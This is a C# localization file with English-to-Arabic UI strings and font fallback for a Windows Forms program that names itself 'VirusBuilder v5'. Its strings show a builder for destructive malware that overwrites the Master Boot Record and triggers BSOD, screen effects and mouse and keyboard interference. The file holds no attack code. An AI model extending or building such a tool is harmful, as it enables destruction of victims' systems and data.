using System.Collections.Generic;
using System.Drawing;
using System.Windows.Forms;

namespace MasonMBR
{
    internal static class Localization
    {
        internal static bool IsArabic = false;

        internal static Font ArabicFont(float size, FontStyle style = FontStyle.Regular)
        {
            foreach (string name in new[] { "Tajawal", "Cairo", "Noto Sans Arabic", "Tahoma", "Arial Unicode MS" })
            {
                try
                {
                    var f = new Font(name, size, style, GraphicsUnit.Point);
                    if (f.Name == name) return f;
                    f.Dispose();
                }
                catch { }
            }
            return new Font("Tahoma", size, style, GraphicsUnit.Point);
        }

        internal static void ApplyFont(Control ctrl, float size = 9f, FontStyle style = FontStyle.Regular)
        {
            if (IsArabic)
            {
                ctrl.Font = ArabicFont(size, style);
            }
        }

        private static readonly Dictionary<string, string> _ar = new Dictionary<string, string>
        {
            { "Build",                          "سولك ملف" },
            { "VirusBuilder",                   "صانع الفايروسات" },
            { "v5.0",                           "النسخه الخامسه" },
            { "BSOD",                           "يطفي الجهاز" },
            { "GDI",                            "الوان" },
            { "Mouse",                          "الماوس" },
            { "Keyboard",                       "الكبورد" },
            { "ICON",                           "أيقونة" },
            { "Screen BG",                      "الخلفية" },
            { "Text BG",                        "خلفية النص" },
            { "Text Color",                     "لون النص" },
            { "Pick Video",                     "اختر مقطع" },
            { "No video",                       "باقي ماخترت مقطع" },
            { "Pick Audio",                     "اختر صوت" },
            { "No audio selected",              "باقي ماخترت صوت" },
            { "VirusBuilder v5",                "صانع الفايروسات النسخه الخامسه" },
            { "Save",                           "حفظ" },
            { "Error",                          "خطأ" },
            { "nasm.dll not found",             "الملف nasm.dll غير موجود" },
            { "No image selected",              "باقي ماخترت صوره" },
            { "[Yes] pick a new image\n[No] remove image and go back to text\n[Cancel] keep current image",
              "[نعم] اختر صورة جديدة\n[لا] احذف الصورة وارجع للنص\n[إلغاء] احتفظ بالصورة الحالية" },
            { "Image Loaded",                   "تم تحميل الصورة" },
            { "Image Rejected",                 "الصورة مرفوضة" },
            { "Format Error",                   "خطأ في الصيغة" },
            { "Cannot change format to non-PE while an icon is selected. Uncheck the icon first",
              "ماتقدر تغير الصيغه لغير PE وأيقونة محددة. ألغِ تحديد الأيقونة أولاً" },
            { "Select MBR Image",               "اختر صورة MBR" },
            { "Select Icon",                    "اختر أيقونة" },
            { "Select Screen Image",            "اختر صورة الشاشة" },
            { "Select Video File",              "اختر ملف فيديو" },
            { "Select Audio File",              "اختر ملف صوتي" },
            { "Enter the text...\r\nto be printed on the MBR...", "اكتب النص هنا...\r\nبيطلع النص بعد تفجير الجهاز..." },
            { "The text to be printed in GDI",  "النص الي بينطبع في الشاشه" },
            { "Select an image or \r\nGIF to display in MBR", "اختر صورة أو\r\nGIF عشان تعرضها في MBR" },
            { "Select an image or GIF to \r\ndisplay in full-screen mode", "اختر صورة أو GIF\r\nعشان تنعرض على كامل الشاشة" },
            { "Assembly Error",                 "خطأ في التجميع" },
            { "Success",                        "تم بنجاح" },
            { "Done!",                          "!تم" },
            { "Size:",                          "الحجم:" },
            { "Path:",                          "المسار:" },
            { "Build failed:",                  "فشل البناء:" },
            { "EN",                             "AR" },
            { "AR",                             "EN" },
        };

        internal static string T(string en)
        {
            if (!IsArabic) return en;
            string val;
            return _ar.TryGetValue(en, out val) ? val : en;
        }
    }
}
